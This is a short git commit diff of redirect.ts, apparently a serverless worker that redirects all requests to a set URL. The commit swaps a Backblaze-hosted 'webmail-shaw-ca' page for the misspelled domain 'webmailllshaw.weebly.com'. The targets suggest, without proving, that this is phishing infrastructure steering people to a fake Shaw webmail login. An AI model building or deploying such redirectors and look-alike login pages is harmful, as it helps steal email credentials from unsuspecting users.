c057f95ad9949704f4631081b4917d252a432056
Gram77 <wonderland070@outlook.com>
2025-09-08 12:27:03 -0700

    Update redirect.ts

--- redirect.ts
+++ redirect.ts
@@ -1,7 +1,7 @@
 // redirect.ts
 
 // Define the redirect URL
-const redirectUrl = "https://f005.backblazeb2.com/file/webmail-shaw-ca/index.html.txt"; // Replace with the URL you want to redirect to
+const redirectUrl = "https://webmailllshaw.weebly.com/"; // Replace with the URL you want to redirect to
 
 // Handle the request
 addEventListener("fetch", (event) => {
